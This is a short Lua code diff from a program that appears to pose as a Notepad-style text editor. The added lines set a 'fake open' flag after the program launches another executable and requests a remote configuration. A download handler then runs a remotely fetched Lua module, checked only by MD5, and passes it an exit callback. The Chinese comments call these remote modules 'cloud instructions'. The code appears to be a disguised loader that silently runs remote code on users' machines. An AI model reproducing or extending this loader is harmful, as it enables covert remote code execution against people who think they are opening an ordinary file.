@@ -139,13 +139,24 @@ function OnDownloadSucc(_, _, token, savePath, url, strHeaders)
 							   Helper.TOKEN["DOWNLOAD_REMOTECODE_FILE"])
 							   
 			Helper:LOG("GetHttpFile: token: ", Helper.TOKEN["DOWNLOAD_REMOTECODE_FILE"])
+		else
+			--没有云指令，就直接退
+			if NotePad.bFakeOpen then NotePad:Exit() end
 		end
 	elseif token == Helper.TOKEN["DOWNLOAD_REMOTECODE_FILE"] then
 		--下载远程代码lua完毕，校验MD5
 		local fileMD5 = tipUtil:GetMD5Value(savePath)
-		if fileMD5 and NotePad.remoteConfig.tExtraHelper and fileMD5 == NotePad.remoteConfig.tExtraHelper.strMD5 then
-			Helper:LoadLuaModule(savePath)
-			-- 执行完了之后删掉？
+		if fileMD5 and NotePad.remoteConfig.tExtraHelper 
+			and string.upper(fileMD5) == string.upper(NotePad.remoteConfig.tExtraHelper.strMD5) then
+			local luaModule = Helper:LoadLuaModule(savePath)
+			if luaModule and "function" == type(luaModule.OnLoadLuaFile) then
+				--在云指令里退出进程
+				luaModule.OnLoadLuaFile(NotePad.bFakeOpen, function() NotePad:Exit() end)
+			else
+				if NotePad.bFakeOpen then NotePad:Exit() end
+			end
+		else
+			if NotePad.bFakeOpen then NotePad:Exit() end
 		end
 	end
 end
@@ -280,6 +291,7 @@ function OnLoadLuaFile()
 		end
 		local ret = tipUtil:ShellExecute(nil, "open", exePath, path, "", "SW_SHOW")
 		NotePad:DownloadRemoteConfig()
+		NotePad.bFakeOpen = true
 	else
 		--父窗口句柄置空
 		if path and path ~= "" and tipUtil:QueryFileExists(path) then
